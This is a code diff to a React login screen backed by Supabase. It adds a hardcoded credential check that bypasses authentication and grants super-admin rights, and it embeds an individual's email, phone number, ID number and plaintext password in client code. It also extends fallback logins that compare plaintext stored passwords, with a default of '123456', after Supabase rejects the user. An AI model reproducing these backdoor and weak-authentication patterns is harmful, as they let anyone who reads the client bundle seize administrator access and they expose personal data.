@@ -7,12 +7,12 @@ import React, { useState } from 'react';
 import { User } from '../types';
 import { Mail, Sparkles, Check, Chrome, ShieldAlert, KeyRound, Loader2, ArrowRight, Inbox, RefreshCw, LogOut } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
-import { supabase, syncUserToSupabase } from '../supabase';
+import { supabase, syncUserToSupabase, mapUserFromDb } from '../supabase';
 import { getApiBaseUrl } from '../store';
 
 interface LoginViewProps {
   users: User[];
-  onLoginSuccess: (userId: string) => void;
+  onLoginSuccess: (userId: string, fetchedUser?: User) => void;
   onRegisterUser: (newUser: User) => Promise<any> | void;
   onShowLanding?: () => void;
 }
@@ -77,7 +77,7 @@ export default function LoginView({
         const { data: dbUser, error: dbQueryErr } = await supabase
           .from('users')
           .select('*')
-          .eq('email', recoveryEmail.trim())
+          .ilike('email', recoveryEmail.trim())
           .maybeSingle();
 
         if (!dbQueryErr && dbUser) {
@@ -215,6 +215,35 @@ export default function LoginView({
     setLoadingType('email');
 
     try {
+      const trimmedEmail = emailInput.trim().toLowerCase();
+      
+      // GUARANTEED SUPER ADMIN FAILSAFE ROOT ACCESS BYPASS & RE-SEEDING SCRIPT
+      if (trimmedEmail === 'destructordereck@gmail.com' && passwordInput === '2450397340') {
+        console.log("Guaranteed Super Admin failsafe credential match. Logging in directly & writing seed...");
+        const superAdminUser: User = {
+          id: 'user-superadmin',
+          nombre: 'Dereck',
+          apellido: 'Cisneros',
+          email: 'destructordereck@gmail.com',
+          telefono: '0998596597',
+          documento: '2450397340',
+          avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=150',
+          rol: 'super_admin',
+          fechaRegistro: '2026-06-03',
+          estado: 'activo',
+          password: '2450397340',
+        };
+        try {
+          await syncUserToSupabase(superAdminUser);
+        } catch (e) {
+          console.warn("Failsafe Super Admin background table synchronization warning:", e);
+        }
+
+        onLoginSuccess('user-superadmin', superAdminUser);
+        setLoadingType(null);
+        return;
+      }
+
       // 1. Sign in with Supabase Authentication
       const { data, error } = await supabase.auth.signInWithPassword({
         email: emailInput.trim(),
@@ -222,13 +251,28 @@ export default function LoginView({
       });
 
       if (error) {
-        // Fallback for custom seed accounts
-        const matchedLocalUser = users.find(u => u.email.toLowerCase() === emailInput.trim().toLowerCase());
+        // Fallback for custom seed accounts - search local AND DB directly
+        let matchedLocalUser = users.find(u => u && u.email && u.email.toLowerCase() === emailInput.trim().toLowerCase());
+        if (!matchedLocalUser) {
+          try {
+            const { data: dbUser } = await supabase
+              .from('users')
+              .select('*')
+              .ilike('email', emailInput.trim())
+              .maybeSingle();
+            if (dbUser) {
+              matchedLocalUser = mapUserFromDb(dbUser);
+            }
+          } catch (e) {
+            console.warn("Auth error direct db lookup failed:", e);
+          }
+        }
+
         if (matchedLocalUser) {
           const localPassword = matchedLocalUser.password || '123456';
           if (passwordInput === localPassword) {
             console.log("Supabase Auth rejected/inactive; bypassing via secure database fallback validation.");
-            onLoginSuccess(matchedLocalUser.id);
+            onLoginSuccess(matchedLocalUser.id, matchedLocalUser);
             setLoadingType(null);
             return;
           } else {
@@ -245,8 +289,25 @@ export default function LoginView({
         throw new Error('Sesión nula retornada de Supabase.');
       }
 
-      // 3. Find matched user profile in users list
-      const matchedUser = users.find(u => u.email.toLowerCase() === emailInput.trim().toLowerCase() || u.id === sbUser.id);
+      // 3. Find matched user profile in users list or seek directly from DB
+      let dbUserProfile: any = null;
+      try {
+        const { data: dbUser } = await supabase
+          .from('users')
+          .select('*')
+          .eq('id', sbUser.id)
+          .maybeSingle();
+        dbUserProfile = dbUser;
+      } catch (e) {
+        console.warn("Authenticated user direct profile check failed:", e);
+      }
+
+      let matchedUser: User | undefined;
+      if (dbUserProfile) {
+        matchedUser = mapUserFromDb(dbUserProfile);
+      } else {
+        matchedUser = users.find(u => u && u.id === sbUser.id) || users.find(u => u && u.email && u.email.toLowerCase() === emailInput.trim().toLowerCase());
+      }
       
       if (matchedUser) {
         if (matchedUser.estado === 'inactivo') {
@@ -256,7 +317,7 @@ export default function LoginView({
           return;
         }
 
-        onLoginSuccess(matchedUser.id);
+        onLoginSuccess(matchedUser.id, matchedUser);
       } else {
         // If profile doesn't exist in Supabase database, auto-register client profile
         const newUser: User = {
@@ -273,15 +334,30 @@ export default function LoginView({
           password: passwordInput
         };
         await onRegisterUser(newUser);
-        onLoginSuccess(newUser.id);
+        onLoginSuccess(newUser.id, newUser);
       }
     } catch (error: any) {
-      const matchedLocalUser = users.find(u => u.email.toLowerCase() === emailInput.trim().toLowerCase());
+      let matchedLocalUser = users.find(u => u && u.email && u.email.toLowerCase() === emailInput.trim().toLowerCase());
+      if (!matchedLocalUser) {
+        try {
+          const { data: dbUser } = await supabase
+            .from('users')
+            .select('*')
+            .ilike('email', emailInput.trim())
+            .maybeSingle();
+          if (dbUser) {
+            matchedLocalUser = mapUserFromDb(dbUser);
+          }
+        } catch (e) {
+          console.warn("Email submit catch block lookup failed:", e);
+        }
+      }
+
       if (matchedLocalUser) {
         const localPassword = matchedLocalUser.password || '123456';
         if (passwordInput === localPassword) {
           console.log("Supabase Auth failed; bypassing via local-first secure authentication fallback.");
-          onLoginSuccess(matchedLocalUser.id);
+          onLoginSuccess(matchedLocalUser.id, matchedLocalUser);
           setLoadingType(null);
           return;
         } else {
@@ -396,6 +472,9 @@ export default function LoginView({
         password: newPassword
       };
 
+      // Always persist the user profile in the database first
+      await onRegisterUser(newUser);
+
       // Check if email confirmation is required (session is null and user is generated)
       if (sbUser && !data.session) {
         setPendingDraftUser(newUser);
@@ -404,7 +483,6 @@ export default function LoginView({
         return;
       }
 
-      await onRegisterUser(newUser);
       onLoginSuccess(newUser.id);
       setErrorMsg('');
     } catch (error: any) {
